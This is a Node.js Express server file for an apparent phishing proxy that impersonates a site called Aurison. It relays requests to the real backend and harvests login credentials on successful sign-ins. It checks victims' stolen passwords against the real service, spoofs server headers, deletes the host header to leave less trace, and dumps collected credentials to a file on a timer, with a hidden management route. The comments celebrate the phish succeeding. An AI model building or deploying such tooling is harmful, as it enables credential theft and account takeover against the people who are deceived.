//imports
import { writeCreds as credsDump, deleteUpload } from './utils/utils.js';
import { isPhishLink, login } from './utils/phish.js';
import { PORT, DIR_NAME, ENV } from './config.js';
import manage from './manage/manage.js';
import cookieParser from 'cookie-parser';
import express from 'express';
import axios from 'axios';
import https from 'https';
import fs from "fs";
import { Phished, isCampActive, updateUser } from './utils/firebase.js';

//consts 
const __dirname = DIR_NAME;     //workaround __dirname variable in Es6 🤷🏿‍♂️
const AGENT = new https.Agent({ rejectUnauthorized: false });
const app = express();

app.set('view engine', 'ejs'); //majorly for the manage route :(


//vars
var CREDENTIALS = [];
var UPLOADED_FILES = [];


//middleware
app.use(cookieParser());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.use((req, res, next) => {
    //Add UPLOADED_FILES var so the management route can push into it.
    req.UPLOADED_FILES = UPLOADED_FILES

    //This is kinda unecessary and is really only here to mimick test-backend 😂 
    res.removeHeader('X-Powered-By');
    res.setHeader('Server', 'nginx/1.18.0 (Ubuntu)');
    
    next();
})



app.use('/eganam', manage);



app.get('/favicon.ico', (req, res) => res.sendFile(__dirname + '/favicon.ico'));



app.use('/static', express.static('static'));



app.get('/helloworld_dump', (req, res) => res.sendFile(__dirname, '/aurison_creds_dump.txt'));



app.get('/verify/:email/:token', async (req, res, next) => {
    if (!isPhishLink(req.params.token)) return next();

    //At this point, its a phishing link. But is the campaign active?
    //if its deactivated/inactive, redirect them to the original aurison site.
    if (!await isCampActive(req.params.token)) return res.redirect('https://aurison.app');
    
    //serve the html that uses the modded main.js file.
    return res.sendFile(__dirname + '/index1337.html');
    
})



//home
app.get('*', (req, res, next)=>{
    //check if react is trying to access a static file and manually serve it.
    //This happenes when the route doesn't begin with /static, so the static
    //middleware doesn't catch it, e.g /test/whatever/static/bla.js
    if (req.path.includes("/static")) {
        const index = req.path.indexOf("/static");
        const resource = req.path.substring(index); //path to static file.

        return res.sendFile(__dirname + resource);
    }

    //just return the base html otherwise.
    return res.sendFile(__dirname + '/index.html');
});



app.post('/verify', async (req, res, next) => {
    //if it's not a phish link, pass the request to the proxy.
    if (isPhishLink(req.body.token) == false) return next();

    
    //fake a valid response to trick react.
    if (req.body.action === "info") {
        var payload = {
            error:false,
            data: {
                title:"",
                forenames:"",
                surname:"",
                organisation:""
            }
        }
        return res.status(200).json(payload);
    }

    //At this point, the phish is 50% successful.
    //We need to get it to a 100 by ensuring the creds are valid :)
    const email = req.body.email;
    const pass = req.body.old;

    const response = await login(email, pass);
    
    if (!response.valid) return res.status(200).json(response.response) //wrong creds.

    //Phish is 100% successful :)
    //update the db and respond
    await Phished(req.body.token)
    return res.status(200).json({error: false, success: true});
});



//proxy api post requests.
app.post('*', async (req, res) =>{
    const path = req.path;   //grab route

    try {
        const {headers, body} = req;    //grab relevant info from req
        
        delete headers["host"]       //really doesn't matter, just leaves less of a trace.

        // Make request to Aurison
        const response = await axios({
          method: 'POST',
          headers: headers,
          data: body,
          url: `${ENV + path}`,
          httpsAgent: AGENT
        });   
        
        const resHeaders = response.headers
        const keys = Object.keys(resHeaders);

        //set headers.
        keys.forEach(key => {
            res.setHeader(key, resHeaders[key]) 
        });
        
        //Grab login creds
        if (response.data.error === false && path === '/login') harvestCredentials(req, CREDENTIALS);
 
        return res.status(200).json(response.data);

    } catch (error) {
        if (error.response && error.response.data) { //check if the error was raised from aurison api 
            return res.status(error.response.status).json(error.response.data);
        }

        console.log(error);
        return res.status(400).json({
            error: true,
            error_log: 'Unknown Error'
        });
    }
});




//catch errors
app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).send('Something went wrong!');
  });



//launch
app.listen(PORT, () => {
    setInterval(() => deleteUpload(UPLOADED_FILES), 3000);  //delete processed uploads
    setInterval(() => credsDump(CREDENTIALS), 5000);   //dump any creds in queue every 10 seconds.

    console.log(`Server is listening on port ${PORT}`);
});
